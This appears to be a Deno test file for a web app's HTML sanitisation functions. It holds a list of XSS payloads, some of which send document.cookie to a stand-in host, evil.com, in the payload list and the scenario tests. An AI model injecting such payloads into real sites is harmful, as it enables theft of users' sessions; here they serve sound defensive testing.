/**
 * XSS Prevention Tests
 *
 * Tests HTML sanitization functions and XSS attack vector prevention.
 */

import {
  assertEquals,
  assertExists,
} from "https://deno.land/std@0.208.0/assert/mod.ts";

import {
  sanitizeHtml,
  stripDangerousContent,
  containsXssPatterns,
  sanitizeObject,
} from "../../_shared/validation-rules.ts";

// ============================================================================
// XSS Payload Test Cases
// ============================================================================

const XSS_PAYLOADS = [
  // Script tags
  '<script>alert("XSS")</script>',
  '<script src="evil.js"></script>',
  '<script>document.cookie</script>',
  "<SCRIPT>alert('XSS')</SCRIPT>",
  '<script>fetch("https://evil.com?c="+document.cookie)</script>',

  // Event handlers
  '<img src="x" onerror="alert(1)">',
  '<svg onload="alert(1)">',
  '<body onload="alert(1)">',
  '<div onclick="alert(1)">click me</div>',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',

  // JavaScript URLs
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)">',
  'javascript:alert(document.domain)',
  "JAvasCRipt:alert('XSS')",

  // Data URLs
  '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',

  // VBScript (legacy IE)
  'vbscript:msgbox("XSS")',

  // Expression (legacy IE)
  '<div style="width: expression(alert(1))">',

  // Encoded payloads
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '%3Cscript%3Ealert(1)%3C/script%3E',

  // Mixed case and whitespace
  '<ScRiPt>alert(1)</ScRiPt>',
  '<script >alert(1)</script >',
  '<script\n>alert(1)</script>',

  // Nested/broken tags
  '<<script>script>alert(1)<</script>/script>',
  '<scr<script>ipt>alert(1)</script>',
];

// ============================================================================
// sanitizeHtml Tests
// ============================================================================

Deno.test("sanitizeHtml - escapes basic HTML characters", () => {
  assertEquals(sanitizeHtml("<script>"), "&lt;script&gt;");
  assertEquals(sanitizeHtml("&"), "&amp;");
  assertEquals(sanitizeHtml('"'), "&quot;");
  assertEquals(sanitizeHtml("'"), "&#x27;");
  assertEquals(sanitizeHtml("`"), "&#x60;");
  assertEquals(sanitizeHtml("/"), "&#x2F;");
  assertEquals(sanitizeHtml("="), "&#x3D;");
});

Deno.test("sanitizeHtml - handles null and undefined", () => {
  assertEquals(sanitizeHtml(null), "");
  assertEquals(sanitizeHtml(undefined), "");
});

Deno.test("sanitizeHtml - preserves safe content", () => {
  assertEquals(sanitizeHtml("Hello World"), "Hello World");
  assertEquals(sanitizeHtml("Price: $10.99"), "Price: $10.99");
  assertEquals(sanitizeHtml("Email: test@example.com"), "Email: test@example.com");
});

Deno.test("sanitizeHtml - escapes all XSS payloads", () => {
  for (const payload of XSS_PAYLOADS) {
    const sanitized = sanitizeHtml(payload);

    // Should not contain unescaped < or >
    if (payload.includes("<")) {
      assertEquals(
        !sanitized.includes("<"),
        true,
        `Payload not sanitized: ${payload}`
      );
    }
    if (payload.includes(">")) {
      assertEquals(
        !sanitized.includes(">"),
        true,
        `Payload not sanitized: ${payload}`
      );
    }
  }
});

Deno.test("sanitizeHtml - handles complex HTML injection", () => {
  const malicious = '<div class="test" onclick="alert(1)">Content</div>';
  const sanitized = sanitizeHtml(malicious);

  assertEquals(sanitized.includes("<div"), false);
  assertEquals(sanitized.includes("onclick"), true); // Text preserved, but escaped
  assertEquals(sanitized.includes("&lt;"), true);
});

// ============================================================================
// stripDangerousContent Tests
// ============================================================================

Deno.test("stripDangerousContent - removes script tags", () => {
  assertEquals(
    stripDangerousContent('<script>alert(1)</script>'),
    ""
  );
  assertEquals(
    stripDangerousContent('Hello<script>evil()</script>World'),
    "HelloWorld"
  );
});

Deno.test("stripDangerousContent - removes event handlers", () => {
  const result = stripDangerousContent('<img src="x" onerror="alert(1)">');
  assertEquals(result.includes("onerror"), false);
});

Deno.test("stripDangerousContent - removes javascript: URLs", () => {
  const result = stripDangerousContent('javascript:alert(1)');
  assertEquals(result.includes("javascript:"), false);
});

Deno.test("stripDangerousContent - removes all HTML tags", () => {
  const result = stripDangerousContent("<b>Bold</b> and <i>italic</i>");
  assertEquals(result, "Bold and italic");
});

Deno.test("stripDangerousContent - handles nested scripts", () => {
  const result = stripDangerousContent(
    '<scr<script>ipt>alert(1)</scr</script>ipt>'
  );
  assertEquals(result.includes("<script"), false);
  assertEquals(result.includes("</script"), false);
});

// ============================================================================
// containsXssPatterns Tests
// ============================================================================

Deno.test("containsXssPatterns - detects script tags", () => {
  assertEquals(containsXssPatterns('<script>alert(1)</script>'), true);
  assertEquals(containsXssPatterns('<SCRIPT>alert(1)</SCRIPT>'), true);
});

Deno.test("containsXssPatterns - detects javascript: URLs", () => {
  assertEquals(containsXssPatterns('javascript:alert(1)'), true);
  assertEquals(containsXssPatterns('JAVASCRIPT:alert(1)'), true);
});

Deno.test("containsXssPatterns - detects event handlers", () => {
  assertEquals(containsXssPatterns('onclick="alert(1)"'), true);
  assertEquals(containsXssPatterns('onerror =alert(1)'), true);
  assertEquals(containsXssPatterns('onload= "alert(1)"'), true);
});

Deno.test("containsXssPatterns - returns false for safe content", () => {
  assertEquals(containsXssPatterns("Hello World"), false);
  assertEquals(containsXssPatterns("onclick is a word"), false); // No equals sign
  assertEquals(containsXssPatterns("Buy script writing software"), false);
});

Deno.test("containsXssPatterns - handles null and undefined", () => {
  assertEquals(containsXssPatterns(null), false);
  assertEquals(containsXssPatterns(undefined), false);
});

// ============================================================================
// sanitizeObject Tests
// ============================================================================

Deno.test("sanitizeObject - sanitizes all string values", () => {
  const input = {
    title: "<script>alert(1)</script>",
    description: "Normal text",
    nested: {
      field: '<img onerror="alert(1)">',
    },
  };

  const result = sanitizeObject(input);

  assertEquals(result.title.includes("<script>"), false);
  assertEquals(result.description, "Normal text");
  assertEquals(result.nested.field.includes("<img"), false);
});

Deno.test("sanitizeObject - preserves non-string values", () => {
  const input = {
    count: 42,
    active: true,
    data: null,
    items: [1, 2, 3],
  };

  const result = sanitizeObject(input);

  assertEquals(result.count, 42);
  assertEquals(result.active, true);
  assertEquals(result.data, null);
  assertEquals(result.items, [1, 2, 3]);
});

Deno.test("sanitizeObject - handles arrays with strings", () => {
  const input = {
    tags: ["<script>", "normal", "<b>bold</b>"],
  };

  const result = sanitizeObject(input);

  assertEquals(result.tags[0], "&lt;script&gt;");
  assertEquals(result.tags[1], "normal");
});

Deno.test("sanitizeObject - respects excludeKeys option", () => {
  const input = {
    html: "<b>Bold</b>",
    text: "<b>Bold</b>",
  };

  const result = sanitizeObject(input, { excludeKeys: ["html"] });

  assertEquals(result.html, "<b>Bold</b>"); // Not sanitized
  assertEquals(result.text.includes("<b>"), false); // Sanitized
});

Deno.test("sanitizeObject - stripDangerous mode removes content", () => {
  const input = {
    content: '<script>alert(1)</script>Hello',
  };

  const result = sanitizeObject(input, { stripDangerous: true });

  assertEquals(result.content, "Hello");
});

// ============================================================================
// Real-world Scenario Tests
// ============================================================================

Deno.test("XSS in listing title is sanitized", () => {
  const listingTitle = '<script>document.location="https://evil.com?c="+document.cookie</script>Free Food';
  const sanitized = sanitizeHtml(listingTitle);

  assertEquals(sanitized.includes("<script>"), false);
  assertEquals(sanitized.includes("</script>"), false);
  assertEquals(sanitized.includes("Free Food"), true);
});

Deno.test("XSS in profile bio is sanitized", () => {
  const bio = 'I love cooking! <img src=x onerror=alert(1)> Check out my recipes.';
  const sanitized = sanitizeHtml(bio);

  assertEquals(sanitized.includes("<img"), false);
  assertEquals(sanitized.includes("onerror"), true); // Text preserved but as escaped
  assertEquals(sanitized.includes("I love cooking!"), true);
});

Deno.test("XSS in product description is sanitized", () => {
  const description = `
    Fresh vegetables from my garden!
    <script>
      fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
    Pick up anytime.
  `;

  const sanitized = sanitizeHtml(description);

  assertEquals(sanitized.includes("<script>"), false);
  assertEquals(sanitized.includes("fetch("), true); // Text preserved but escaped
  assertEquals(sanitized.includes("Fresh vegetables"), true);
});

Deno.test("Stored XSS via JSON injection is prevented", () => {
  const maliciousInput = {
    title: '"></script><script>alert(1)</script><script x="',
    description: "Normal description",
  };

  const sanitized = sanitizeObject(maliciousInput);

  // When rendered in HTML, this should be safe
  assertEquals(sanitized.title.includes("<script>"), false);
  assertEquals(sanitized.title.includes("</script>"), false);
});
